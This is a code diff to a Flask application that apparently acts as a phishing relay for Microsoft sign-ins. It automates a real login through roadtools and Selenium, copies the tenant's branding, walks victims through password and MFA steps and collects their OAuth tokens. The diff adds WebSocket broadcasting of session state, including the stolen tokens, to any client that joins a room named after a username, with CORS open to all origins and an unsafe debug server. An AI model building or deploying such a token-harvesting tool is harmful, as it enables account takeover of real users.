@@ -57,6 +57,7 @@ from typing import Optional
 from urllib.parse import urlparse, parse_qs
 
 from flask import Flask, request, jsonify, render_template, redirect, url_for
+from flask_socketio import SocketIO, join_room
 
 from roadtools.roadtx.selenium import SeleniumAuthentication
 from selenium import webdriver as _selenium_webdriver
@@ -88,7 +89,7 @@ CLIENT_ID = WELLKNOWN_CLIENTS["azcli"]
 RESOURCE = WELLKNOWN_RESOURCES["msgraph"]
 REDIRURL = "https://login.microsoftonline.com/common/oauth2/nativeclient"
 DRIVERPATH = os.environ.get("GECKODRIVER_PATH")
-HEADLESS = True
+HEADLESS = False
 STEP_TIMEOUT = 60
 POLL_TIMEOUT_OVERALL = 300  # background job gives up after this long total
 
@@ -560,6 +561,7 @@ def session_safe(stage_on_error: Optional[Stage] = None):
                     session.error = str(exc)
                     if stage_on_error:
                         session.stage = stage_on_error
+                _emit_status(username, session)
                 # Only quit the driver on an unexpected error — a clean return
                 # (e.g. wrong-password detected) leaves the driver open for retry.
                 try:
@@ -618,6 +620,8 @@ def _finish_credentials_flow(username: str, session: LoginSession, driver) -> No
     except TimeoutException:
         pass
 
+    _prev_stage = None
+    _prev_error = None
     while time.time() - started < POLL_TIMEOUT_OVERALL:
         if "?code=" in driver.current_url:
             break
@@ -629,6 +633,11 @@ def _finish_credentials_flow(username: str, session: LoginSession, driver) -> No
             session.stage = stage
             session.error = pw_error          # None clears stale error on re-try
             session.mfa_options = _scrape_mfa_options(driver) if stage == Stage.AWAITING_MFA_CHOICE else []
+        # Push to WebSocket clients only when something changed — avoids
+        # spamming the socket on every 0.5s tick while waiting for MFA.
+        if stage != _prev_stage or pw_error != _prev_error:
+            _emit_status(username, session)
+            _prev_stage, _prev_error = stage, pw_error
         if pw_error:
             # Wrong password — stop polling so the frontend can re-enable the
             # password field for a retry without killing the browser.
@@ -655,6 +664,8 @@ def _finish_credentials_flow(username: str, session: LoginSession, driver) -> No
     with session.lock:
         session.tokens = tokens
         session.stage = Stage.SUCCEEDED
+
+    _emit_status(username, session)
 
     # Browser is no longer needed — clean it up in the background.
     threading.Thread(target=_quit_driver_safely, args=(driver,), daemon=True).start()
@@ -766,6 +777,7 @@ def _run_org_login_job(username: str):
 # ---------------------------------------------------------------------------
 
 app = Flask(__name__)
+socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")
 
 app.secret_key = "paste-your-random-string-here"
 app.register_blueprint(admin_bp)
@@ -930,6 +942,8 @@ def _run_username_job(username: str, session: "LoginSession") -> None:
             session.footer_text = branding.get("footer_text")
             session.browser_ready = True   # Firefox is now on the password page
 
+        _emit_status(username, session)
+
         # Now that the password screen is ready, pre-warm the next Firefox
         # instance in background — this way only ONE Firefox is visible during
         # the email-validation step, and the second one appears after the user
@@ -940,6 +954,7 @@ def _run_username_job(username: str, session: "LoginSession") -> None:
         with session.lock:
             session.stage = Stage.FAILED
             session.error = str(exc)
+        _emit_status(username, session)
     except RuntimeError as exc:
         # Short user-facing message (e.g. username validation error)
         threading.Thread(target=_quit_driver_safely,
@@ -948,13 +963,47 @@ def _run_username_job(username: str, session: "LoginSession") -> None:
         with session.lock:
             session.stage = Stage.FAILED
             session.error = str(exc)
+        _emit_status(username, session)
     except Exception as exc:
         with session.lock:
             session.stage = Stage.FAILED
             # Strip noisy Selenium stacktraces from the user-facing message
             msg = str(exc).split("\n")[0].replace("Message: ", "").strip()
             session.error = msg or "An unexpected error occurred."
+        _emit_status(username, session)
 
+
+# ---------------------------------------------------------------------------
+# WebSocket helpers
+# ---------------------------------------------------------------------------
+
+def _emit_status(username: str, session: "LoginSession") -> None:
+    """Push the current session state to all WebSocket clients in the username room.
+    Called from background threads whenever stage/error changes — replaces polling."""
+    with session.lock:
+        payload = {
+            "ok": session.stage != Stage.FAILED,
+            "stage": session.stage,
+            "mfa_options": session.mfa_options,
+            "federated_domain": session.federated_domain,
+            "error": session.error,
+            "tokens": session.tokens,
+            "background_image": session.background_image,
+            "logo": session.logo,
+            "footer_text": session.footer_text,
+        }
+    socketio.emit("status", payload, room=username)
+
+
+@socketio.on("join")
+def on_join(data):
+    """Client calls this after submitting a username to subscribe to push updates."""
+    username = (data or {}).get("username", "").strip()
+    if username:
+        join_room(username)
+
+
+# ---------------------------------------------------------------------------
 
 @app.route("/login/username", methods=["POST"])
 def login_username():
@@ -1154,4 +1203,4 @@ def login_mfa_code():
 
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5050)), debug=True, use_reloader=True)
+    socketio.run(app, host="0.0.0.0", port=int(os.environ.get("PORT", 5050)), debug=True, use_reloader=True, allow_unsafe_werkzeug=True)
